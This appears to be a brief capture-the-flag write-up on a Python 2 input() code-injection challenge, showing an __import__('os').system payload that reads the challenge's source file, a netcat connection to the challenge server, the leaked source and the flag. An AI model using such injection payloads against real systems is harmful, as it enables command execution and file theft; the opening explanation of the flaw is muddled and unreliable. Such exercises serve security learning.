The vulnerability in input() method lies in the fact that the variable accessing
the value of input can be accessed by anyone just by using the name of variable or method.

In other words, our input will be treated as python code and will be executed.

__import__('os').system('cat /srv/pwn05/programa.py')

nc 45.63.104.42 4553
__import__('os').system('cat /srv/pwn05/programa.py')
senha = input("")

if senha == 1337133731415:
        print "Pegue sua flag: ALQ{3val_c0m_python_2}"
else:
        print "Errouuuu!!!!"
Errouuuu!!!!
